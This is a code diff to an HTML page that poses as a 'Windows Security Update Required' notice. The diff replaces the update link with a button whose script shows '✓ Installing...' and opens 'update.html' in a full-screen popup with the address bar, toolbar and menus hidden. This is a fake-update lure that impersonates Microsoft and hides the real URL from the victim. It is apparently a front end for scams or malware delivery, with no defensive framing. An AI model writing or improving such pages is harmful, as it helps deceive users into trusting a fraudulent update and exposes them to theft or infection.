@@ -10,8 +10,9 @@
   .icon{font-size:64px;margin-bottom:20px}
   h1{font-size:28px;font-weight:300;margin-bottom:20px}
   p{margin-bottom:30px;opacity:.8;line-height:1.6}
-  .btn{background:#0078d4;color:#fff;border:0;padding:15px 50px;font-size:18px;border-radius:6px;cursor:pointer;display:inline-block;text-decoration:none}
+  .btn{background:#0078d4;color:#fff;border:0;padding:15px 50px;font-size:18px;border-radius:6px;cursor:pointer}
   .btn:hover{background:#005a9e}
+  .btn:disabled{background:#444;cursor:not-allowed}
 </style>
 </head>
 <body>
@@ -19,7 +20,16 @@
   <div class="icon">🔧</div>
   <h1>Windows Security Update Required</h1>
   <p>Critical security patches are available.<br><strong>Click below to install.</strong></p>
-  <a class="btn" href="update.html" target="_blank">⚠️ Update Now</a>
+  <button class="btn" id="goBtn">⚠️ Update Now</button>
 </div>
+<script>
+document.getElementById('goBtn').onclick = function() {
+  this.disabled = true;
+  this.textContent = '✓ Installing...';
+  // Fungua popup kwa ukubwa wa skrini nzima
+  var w = screen.width, h = screen.height;
+  window.open('update.html','_blank','width='+w+',height='+h+',top=0,left=0,toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no');
+};
+</script>
 </body>
 </html>
